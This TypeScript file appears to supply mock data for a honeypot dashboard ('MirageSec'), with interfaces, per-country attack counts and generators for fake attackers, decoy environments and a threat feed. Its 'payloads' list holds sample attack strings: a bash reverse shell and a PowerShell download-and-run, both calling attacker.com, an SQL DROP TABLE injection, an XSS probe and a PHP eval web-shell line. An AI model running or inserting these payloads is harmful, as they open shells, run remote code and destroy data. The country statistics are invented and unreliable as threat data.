// Mock data for MirageSec dashboard
// This file contains realistic threat intelligence and attack data

export interface AttackLocation {
  country: string;
  countryCode: string;
  lat: number;
  lng: number;
  attacks: number;
  threatLevel: 'critical' | 'high' | 'medium' | 'low';
}

export interface ActiveAttacker {
  id: string;
  fingerprint: string;
  country: string;
  countryCode: string;
  timeInEnvironment: number; // minutes
  techniques: string[];
  skillLevel: 'novice' | 'intermediate' | 'advanced' | 'expert';
  behaviorSummary: string;
  status: 'active' | 'idle' | 'trapped';
  entryTime: Date;
  lastActivity: Date;
}

export interface DeceptionEnvironment {
  id: string;
  name: string;
  type: 'admin_panel' | 'database' | 'api' | 'file_server' | 'email_server';
  status: 'active' | 'under_attack' | 'compromised' | 'idle';
  attackerCount: number;
  aiAdaptationLevel: number; // 0-100
  honeypots: number;
  lastTriggered: Date;
  description: string;
}

export interface ThreatIntelligence {
  id: string;
  timestamp: Date;
  type: 'attack_attempt' | 'tool_detected' | 'technique_used' | 'payload_detected';
  description: string;
  payload?: string;
  toolSignature?: string;
  technique?: string;
  riskScore: number; // 0-100
  source: string;
  status: 'new' | 'analyzed' | 'resolved';
}

export interface AnalyticsData {
  timestamp: Date;
  attacksDetected: number;
  attackersTrapped: number;
  environmentsActive: number;
  averageTimeInEnvironment: number;
}

// Country data with attack statistics
const countries: AttackLocation[] = [
  { country: 'China', countryCode: 'CN', lat: 35.8617, lng: 104.1954, attacks: 2847, threatLevel: 'critical' },
  { country: 'Russia', countryCode: 'RU', lat: 61.524, lng: 105.3188, attacks: 2156, threatLevel: 'critical' },
  { country: 'North Korea', countryCode: 'KP', lat: 40.3399, lng: 127.5101, attacks: 1203, threatLevel: 'critical' },
  { country: 'Iran', countryCode: 'IR', lat: 32.4279, lng: 53.6880, attacks: 892, threatLevel: 'high' },
  { country: 'Vietnam', countryCode: 'VN', lat: 14.0583, lng: 108.2772, attacks: 756, threatLevel: 'high' },
  { country: 'Brazil', countryCode: 'BR', lat: -14.2350, lng: -51.9253, attacks: 634, threatLevel: 'medium' },
  { country: 'India', countryCode: 'IN', lat: 20.5937, lng: 78.9629, attacks: 523, threatLevel: 'medium' },
  { country: 'Romania', countryCode: 'RO', lat: 45.9432, lng: 24.9668, attacks: 412, threatLevel: 'medium' },
  { country: 'Ukraine', countryCode: 'UA', lat: 48.3794, lng: 31.1656, attacks: 387, threatLevel: 'high' },
  { country: 'United States', countryCode: 'US', lat: 37.0902, lng: -95.7129, attacks: 234, threatLevel: 'low' },
];

const techniques = [
  'SQL Injection',
  'XSS Attack',
  'Brute Force',
  'Privilege Escalation',
  'Lateral Movement',
  'Data Exfiltration',
  'Malware Deployment',
  'Phishing',
  'DDoS Attack',
  'Zero-Day Exploit',
  'Man-in-the-Middle',
  'Session Hijacking',
  'Buffer Overflow',
  'Directory Traversal',
  'Command Injection',
];

const toolSignatures = [
  'Metasploit',
  'Burp Suite',
  'Nmap',
  'Wireshark',
  'Hydra',
  'SQLmap',
  'Nikto',
  'Mimikatz',
  'Empire',
  'Cobalt Strike',
];

const payloads = [
  'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
  'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"',
  '\'; DROP TABLE users; --',
  '<img src=x onerror="alert(\'XSS\')">',
  'exec(base64_decode($_POST[\'cmd\']))',
];

const behaviorSummaries = [
  'Systematic reconnaissance of database structure, attempting to extract schema information. High confidence in SQL injection attempts.',
  'Aggressive brute-force attack on admin credentials. Multiple failed login attempts detected. Attacker showing persistence.',
  'Lateral movement detected. Attacker attempting to escalate privileges and access internal systems. Advanced techniques observed.',
  'Passive reconnaissance phase. Attacker mapping network topology and identifying potential entry points.',
  'Active exploitation phase. Attacker deploying custom malware and establishing persistence mechanisms.',
  'Data exfiltration attempt detected. Attacker accessing sensitive files and attempting to transfer data externally.',
  'Command execution attempts observed. Attacker trying to gain shell access to compromised systems.',
  'Privilege escalation in progress. Attacker exploiting known vulnerabilities to gain higher access levels.',
];

const environmentTypes = [
  { type: 'admin_panel', name: 'Fake Admin Dashboard', description: 'Decoy WordPress admin panel' },
  { type: 'database', name: 'Honeypot Database', description: 'Fake MySQL database with fake credentials' },
  { type: 'api', name: 'Mock API Server', description: 'Fake REST API with sensitive endpoints' },
  { type: 'file_server', name: 'File Share Trap', description: 'Decoy SMB file server' },
  { type: 'email_server', name: 'Email Gateway', description: 'Fake Exchange server' },
];

// Generate mock attackers
export function generateMockAttackers(count: number = 12): ActiveAttacker[] {
  const attackers: ActiveAttacker[] = [];
  
  for (let i = 0; i < count; i++) {
    const country = countries[Math.floor(Math.random() * countries.length)];
    const entryTime = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    
    attackers.push({
      id: `ATK-${String(i + 1).padStart(5, '0')}`,
      fingerprint: `${Math.random().toString(16).slice(2, 10)}.${Math.random().toString(16).slice(2, 10)}`,
      country: country.country,
      countryCode: country.countryCode,
      timeInEnvironment: Math.floor((Date.now() - entryTime.getTime()) / 60000),
      techniques: techniques.slice(0, Math.floor(Math.random() * 4) + 1),
      skillLevel: ['novice', 'intermediate', 'advanced', 'expert'][Math.floor(Math.random() * 4)] as any,
      behaviorSummary: behaviorSummaries[Math.floor(Math.random() * behaviorSummaries.length)],
      status: ['active', 'idle', 'trapped'][Math.floor(Math.random() * 3)] as any,
      entryTime,
      lastActivity: new Date(Date.now() - Math.random() * 5 * 60 * 1000),
    });
  }
  
  return attackers;
}

// Generate mock deception environments
export function generateMockEnvironments(count: number = 8): DeceptionEnvironment[] {
  const environments: DeceptionEnvironment[] = [];
  
  for (let i = 0; i < count; i++) {
    const envType = environmentTypes[i % environmentTypes.length];
    
    environments.push({
      id: `ENV-${String(i + 1).padStart(4, '0')}`,
      name: envType.name,
      type: envType.type as any,
      status: ['active', 'under_attack', 'compromised', 'idle'][Math.floor(Math.random() * 4)] as any,
      attackerCount: Math.floor(Math.random() * 15),
      aiAdaptationLevel: Math.floor(Math.random() * 100),
      honeypots: Math.floor(Math.random() * 50) + 10,
      lastTriggered: new Date(Date.now() - Math.random() * 60 * 60 * 1000),
      description: envType.description,
    });
  }
  
  return environments;
}

// Generate mock threat intelligence feed
export function generateMockThreatFeed(count: number = 15): ThreatIntelligence[] {
  const feed: ThreatIntelligence[] = [];
  
  for (let i = 0; i < count; i++) {
    const types = ['attack_attempt', 'tool_detected', 'technique_used', 'payload_detected'] as const;
    const type = types[Math.floor(Math.random() * types.length)];
    
    let description = '';
    let payload = undefined;
    let toolSignature = undefined;
    let technique = undefined;
    
    switch (type) {
      case 'attack_attempt':
        description = `SQL injection attempt detected on endpoint /api/users`;
        break;
      case 'tool_detected':
        toolSignature = toolSignatures[Math.floor(Math.random() * toolSignatures.length)];
        description = `Attacker tool signature identified: ${toolSignature}`;
        break;
      case 'technique_used':
        technique = techniques[Math.floor(Math.random() * techniques.length)];
        description = `Attack technique detected: ${technique}`;
        break;
      case 'payload_detected':
        payload = payloads[Math.floor(Math.random() * payloads.length)];
        description = `Malicious payload intercepted`;
        break;
    }
    
    feed.push({
      id: `TI-${String(i + 1).padStart(6, '0')}`,
      timestamp: new Date(Date.now() - Math.random() * 60 * 60 * 1000),
      type,
      description,
      payload,
      toolSignature,
      technique,
      riskScore: Math.floor(Math.random() * 100),
      source: `Attacker-${Math.floor(Math.random() * 100)}`,
      status: ['new', 'analyzed', 'resolved'][Math.floor(Math.random() * 3)] as any,
    });
  }
  
  return feed.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
}

// Generate mock analytics data
export function generateMockAnalytics(days: number = 7): AnalyticsData[] {
  const data: AnalyticsData[] = [];
  
  for (let i = 0; i < days * 24; i++) {
    const timestamp = new Date(Date.now() - (days * 24 - i) * 60 * 60 * 1000);
    
    data.push({
      timestamp,
      attacksDetected: Math.floor(Math.random() * 500) + 100,
      attackersTrapped: Math.floor(Math.random() * 50) + 10,
      environmentsActive: Math.floor(Math.random() * 8) + 5,
      averageTimeInEnvironment: Math.floor(Math.random() * 240) + 30,
    });
  }
  
  return data;
}

// Get attack locations for map
export function getAttackLocations(): AttackLocation[] {
  return countries;
}

// Real-time counter updates
export function generateRealtimeCounters() {
  return {
    activeEnvironments: Math.floor(Math.random() * 8) + 5,
    attackersTrapped: Math.floor(Math.random() * 50) + 20,
    threatsDetected: Math.floor(Math.random() * 1000) + 500,
    avgTimeInEnvironment: Math.floor(Math.random() * 240) + 30,
  };
}
